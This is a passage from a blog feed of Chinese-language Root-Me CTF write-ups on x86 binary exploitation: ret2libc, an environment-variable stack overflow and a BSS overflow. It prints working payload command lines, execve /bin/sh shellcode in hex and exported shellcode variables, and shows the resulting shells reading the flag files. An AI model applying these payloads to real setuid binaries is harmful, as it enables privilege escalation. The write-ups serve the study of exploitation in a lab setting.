class="line"></span><br></pre></td></tr></table></figure><p>查找”/bin/sh”在libc中的位置</p><pre><code>gdb-peda$ searchmem &quot;/bin/sh&quot; 0xb7e27000 0xb7fd6000Searching for &#39;/bin/sh&#39; in range: 0xb7e27000 - 0xb7fd6000Found 1 results, display max 1 items:libc.so.6 : 0xb7f8ad4c (&quot;/bin/sh&quot;)</code></pre><p>或者<br><code>gdb-peda$ find &quot;/bin/sh&quot;</code></p><p>成功，中间exit()不用连接也可以<br>for exiting without segmentation fault, it’s necessary to replace the ‘DDDD’ with a valid address (e.g address to libc’s exit function).<br>需要退出没有段报错，将DDDD用exit替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch33@challenge02:~$ ./ch33 $(python -c <span class="string">&quot;print &#x27;a&#x27;*32+&#x27;\x10\x83\xe6\xb7&#x27;+&#x27;AAAA&#x27;+&#x27;\x4c\xad\xf8\xb7&#x27;&quot;</span>)</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·AAAAL­ø·</span><br><span class="line">$ id</span><br><span class="line">uid=1233(app-systeme-ch33-cracked) gid=1133(app-systeme-ch33) groups=1133(app-systeme-ch33),100(users)</span><br><span class="line">$ cat .passwd</span><br></pre></td></tr></table></figure><p><code>/bin/sh</code> used to point to<code>/bin/bash</code>on most GNU/Linux systems.</p><hr><p>查看布局的另一种方法<br><code>maintenance info sections ALLOBJ</code><br>Object file: /lib/x86_64-linux-gnu/libc.so.6<br> [0]      0x7ffff7de42e0-&gt;0x7ffff7de4304 at 0x000002e0: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [1]      0x7ffff7de4304-&gt;0x7ffff7de4324 at 0x00000304: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [2]      0x7ffff7de4328-&gt;0x7ffff7de781c at 0x00000328: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [3]      0x7ffff7de7820-&gt;0x7ffff7deb4d4 at 0x00003820: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [4]      0x7ffff7deb4d8-&gt;0x7ffff7df9308 at 0x000074d8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [5]      0x7ffff7df9308-&gt;0x7ffff7dff3c9 at 0x00015308: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Stack-buffer-overflow-basic-6&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-6&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 6&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 6&lt;/h1&gt;&lt;p&gt;&lt;code&gt;return to libc&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; ** argv)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; message[&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Usage: %s &amp;lt;message&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setreuid(geteuid(), geteuid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt; (message, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Your message: %s\n&amp;quot;&lt;/span&gt;, message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - stack buffer overflow basic 4</title>
    <link href="http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/"/>
    <id>http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</id>
    <published>2020-12-29T13:26:05.000Z</published>
    <updated>2020-12-29T13:54:15.356Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-stack-buffer-overflow-basic-4"><a href="#ELF-x86-stack-buffer-overflow-basic-4" class="headerlink" title="ELF x86 - stack buffer overflow basic 4"></a>ELF x86 - stack buffer overflow basic 4</h1><p>参考: </p><ol><li><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a></li><li><a href="https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md">https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md</a></li><li><a href="http://showlinkroom.me/2017/12/04/Root-me-App-System02/">http://showlinkroom.me/2017/12/04/Root-me-App-System02/</a></li><li><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution">https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution</a></li></ol><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><code>struct EnvInfo GetEnv(void)&#123;&#125;</code> 中有<code>strcpy()</code>函数，存在溢出点。</p><pre><code>            +----------------------------+            |      HOME env variable     |     %ebp - 540            +----------------------------+            |    USERNAME env variable   |     %ebp - 412            +----------------------------+            |      SHELL env variable    |     %ebp - 284            +----------------------------+            |      PATH env variable     |     %ebp - 156            +----------------------------+            |           saved ebp        |            +----------------------------+            |        return address      |     %ebp + 4            +----------------------------+            |   rep movsl dest. address  |     %ebp + 8            +----------------------------+  </code></pre><a id="more"></a><p>Since 540 - 128 = 412, 412 - 128 = 284 and 284 - 128 = 156, we get the following stack summary:</p><ul><li>%ebp - 540​ | env.home​​ ​​</li><li>%ebp - 412 | env.username</li><li>%ebp - 284 | env.shell</li><li>%ebp - 156 | env.path</li><li>%ebp | saved frame pointer</li><li>%ebp + 4 | saved EIP</li><li>%ebp + 8 | rep movsl destination address</li></ul><p>var char *dest @ ebp-0x21c</p><p>0x08048590 e8dbfdffff     sym.imp.strcpy ();[og] 第二次的赋值，USERNAME</p><pre><code>gdb-peda$ x/101xw 0xbffff3cc 存输入值0xbffff3cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff40c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff41c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff42c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff43c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff44c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff45c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff46c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff47c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff48c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff49c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ac:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4bc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff50c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff51c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff52c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff53c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff54c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff55c:     0x0804a000</code></pre><p><code>EAX: 0xbffff44c (&#39;a&#39; &lt;repeats 200 times&gt;...)</code><br>存shell 字符串</p><p><code>EAX: 0xbffff4cc (&#39;a&#39; &lt;repeats 128 times&gt;, &quot;e\377\377\277&quot;, &#39;a&#39; &lt;repeats 12 times&gt;)</code><br>放path</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disas GetEnv</span></span><br><span class="line">[...] # How much memory is allocated?</span><br><span class="line">0x080484aa &lt;+6&gt;:        sub    $0x22c,%esp      # (1)</span><br><span class="line">[...] # Let&#x27;s see what happens after the last &#x27;strcpy&#x27; call...</span><br><span class="line">   0x080485c0 &lt;+284&gt;:        call   0x8048390 &lt;strcpy@plt&gt; </span><br><span class="line">   0x080485c5 &lt;+289&gt;:        mov    0x8(%ebp),%eax # (2-dest)</span><br><span class="line">   0x080485c8 &lt;+292&gt;:        lea    -0x21c(%ebp),%edx # (3-source)</span><br><span class="line">   0x080485ce &lt;+298&gt;:        mov    $0x200,%ebx # (4-length) </span><br><span class="line">[...] # Some alignment details skipped...</span><br><span class="line">   0x08048602 &lt;+350&gt;:        mov    %ebx,%ecx # (4-length)</span><br><span class="line">   0x08048604 &lt;+352&gt;:        shr    $0x2,%ecx # (4-length)</span><br><span class="line">   0x08048607 &lt;+355&gt;:        mov    %eax,%edi # (2-dest)</span><br><span class="line">   0x08048609 &lt;+357&gt;:        mov    %edx,%esi # (3-source)</span><br><span class="line">   0x0804860b &lt;+359&gt;:        rep movsl %ds:(%esi),%es:(%edi)</span><br></pre></td></tr></table></figure><ul><li><p> program allocates 0x22c = 556 bytes (an EnvInfo struct is around 512 bytes long),</p></li><li><p> rep movsl … instruction at the end of the function, which consists of copying <strong>n long words **from %esi to %edi, with n being the value stored in **%ecx</strong> ;</p></li><li><p>it loads an address located at %ebp + 8 into the %edi register (destination address)</p></li><li><p>it loads the address of %ebp - 540 (0x21c = 540) into the %esi register (source address)</p></li><li><p>%ecx is initially set <strong>to 0x200(512) **and then **divided by 4 (shr $2)</strong>, i.e., %ecx <strong>equals 128</strong>. Hence, 128 long (4-bytes) words will be copied, resulting in the 512 bytes of the 4 buffers of an EnvInfo struct.</p><p>in order to output its EnvInfo struct, GetEnv <strong>creates a local struct</strong> where it stores the data first, and then, in its prologue**, GetEnv actually replicates the local struct into a “remote” struct, l<strong>ocated at the address read **at %ebp + 8</strong><br>还要复制结构体</p></li></ul><p><code> $PATH=$(python -c &#39;print &quot;/usr/local/bin:&quot; + &quot;A&quot; * (164-16)&#39;) peda -ex &quot;run&quot; ./ch8</code><br>这命令</p><p>如果打印420（412+4 =416 在这里输入4个字节，总长变为420） a，溢出</p><pre><code>gdb-peda$ x/16xb 0xbffff55c0xbffff55c:     0x61    0x61    0x61    0x61    0x00    0xf5    0xff    0xbf</code></pre><p>path后面跟着一个null \00<br>会改变指针值，结构体赋值到$ebp+8指向的地址处</p><p>打印416 a</p><pre><code>0xbffff55c:     0x08048600      0xbffff570</code></pre><p>没有改变ebp+8<br>这个地址是main中env结构体地址</p><h2 id="或者重新分配512字节可写空间"><a href="#或者重新分配512字节可写空间" class="headerlink" title="或者重新分配512字节可写空间"></a>或者重新分配512字节可写空间</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * ptr;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">        ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code> cd /tmp; gcc -m32 -o find_env find_env.c; cd -</code></p><pre><code>app-systeme-ch8@challenge02:~$ export SHELLCODE=`python -c &quot;print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;`app-systeme-ch8@challenge02:~$ export JUNK=`python -c &quot;print &#39;B&#39; * 1000&quot;`app-systeme-ch8@challenge02:~$ /tmp/find_env SHELLCODE ./ch8SHELLCODE will be at 0xbffff931app-systeme-ch8@challenge02:~$ /tmp/find_env JUNK ./ch8JUNK will be at 0xbffffb2b</code></pre><p><code>export PATH=</code>python -c “print ‘A’*160 + ‘\x31\xf9\xff\xbf’ + ‘\x2b\xfb\xff\xbf’”``</p><hr><p>我们将shellcode放在USERNAME上，我试了几个shellcode，只有这个有用，</p><pre><code>export USERNAME=`python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;`</code></pre><p>总长33字节</p><p>然后溢出PATH，要保证$ebp+8的值不变（小端序），<br>path长119，再填充一个<code>：</code>，保持为4的倍数，</p><pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/:`python -c &#39;print(&quot;\x6c\xf5\xff\xbf&quot;*11+&quot;\x50\xf7\xff\xbf&quot;)&#39;`</code></pre><p><code>0xbfff56c</code>是USERNAME地址，<code>0xbffff750</code>是$ebp+8的值，现在PATH总长168。</p><pre><code>app-systeme-ch8@challenge02:~$ ./ch8[+] Getting env...bash-4.4$ cat .passwd</code></pre><h2 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h2><h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><p><code>export USERNAME=</code></p><p>gdb中<br><code>set env USERNAME=</code></p><p>查看<br><code>x/x env.path</code></p><h3 id="查看环境变量长度"><a href="#查看环境变量长度" class="headerlink" title="查看环境变量长度"></a>查看环境变量长度</h3><p><code>echo $&#123;#PATH&#125;</code></p><hr><p><code>gdb-peda$ print $ebp-0xbffff55c</code></p><p><code>disas GetEnv</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-stack-buffer-overflow-basic-4&quot;&gt;&lt;a href=&quot;#ELF-x86-stack-buffer-overflow-basic-4&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - stack buffer overflow basic 4&quot;&gt;&lt;/a&gt;ELF x86 - stack buffer overflow basic 4&lt;/h1&gt;&lt;p&gt;参考: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&quot;&gt;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&quot;&gt;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&quot;&gt;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;p&gt;&lt;code&gt;struct EnvInfo GetEnv(void)&amp;#123;&amp;#125;&lt;/code&gt; 中有&lt;code&gt;strcpy()&lt;/code&gt;函数，存在溢出点。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  &lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - BSS buffer overflow &amp; 构造shellcode</title>
    <link href="http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/"/>
    <id>http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/</id>
    <published>2020-12-28T12:24:01.000Z</published>
    <updated>2020-12-28T13:11:00.839Z</updated>
    
    <content type="html"><![CDATA[<p>ELF x86 - BSS buffer overflow &amp; 构造shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> username[<span class="number">512</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">void</span> (*_atexit)(<span class="keyword">int</span>) =  <span class="built_in">exit</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cp_username</span><span class="params">(<span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>((*(name++) = *(arg++)));</span><br><span class="line">  *name = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Usage : %s &lt;username&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  cp_username(username, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Running program with username : %s\n&quot;</span>, username);</span><br><span class="line">   </span><br><span class="line">  _atexit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>参考：<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow</a></p><p>The atexit and the username are global variables. Therefore, those variables positioned at the .bss section.</p><p>r2查看</p><pre><code>0x0804a040 512 obj.username0x0804a240 4 obj._atexit</code></pre><p>用username溢出exit，控制EIP</p><pre><code>./ch7 `python -c &quot;print &#39;\x6A\x46\x31\xDB\x80\xC7\x04\x80\xC3\xB7\x89\xD9\x58\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;`</code></pre><p>shellcode放在开头。</p><p><a href="http://www.kernel-panic.it/security/shellcode/shellcode5.html">http://www.kernel-panic.it/security/shellcode/shellcode5.html</a><br>生成shellcode:<br>execve(“/bin//sh”, [“/bin//sh”], NULL)</p><ol><li>a pointer to the name of the program to execute (in our case a pointer to the string <code>&quot;/bin/sh&quot;</code>);</li><li>a pointer to an array of strings to pass as <code>arguments </code>to the program (the first argument must be<code> argv[0]</code>, i.e. the name of the program itself). The <code>last element </code>of the array must be <code>a null pointer</code>;</li><li>a pointer to an array of strings to pass as environment to the program. These strings are usually in the form “key=value” and the last element must be a null pointer.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *args[<span class="number">2</span>];</span><br><span class="line">        args[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">        args[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/root_me/app_system]└──╼ $./get_shell $ ls</code></pre><p>需要解决的问题：</p><ol><li>shellcode中不能有NULL字符</li><li>需要’/bin/sh’的地址</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 